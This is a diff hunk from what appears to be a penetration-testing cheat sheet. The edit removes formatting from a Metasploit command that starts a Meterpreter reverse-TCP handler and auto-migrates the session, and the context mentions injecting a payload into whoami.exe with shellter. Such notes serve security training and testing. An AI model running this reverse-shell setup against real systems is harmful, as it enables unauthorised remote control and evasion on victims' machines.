@@ -898,10 +898,10 @@ Inject the payload in a trustworthy exe like whoami.exe with the help of shellte
 
     msfconsole -q -x "use exploit/multi/handler;\
     set PAYLOAD windows/meterpreter/reverse_tcp;\
-    <span custom-style="BoldCodeRed">set AutoRunScript post/windows/manage/migrate;\
+    set AutoRunScript post/windows/manage/migrate;\
     set LHOST <ip>;\
     set LPORT <port>;\
-    run"</span>
+    run"
 
 This will start a session handler and wait for incomming reverse shell requests. Then directly automigrate the process to a new process. 
 
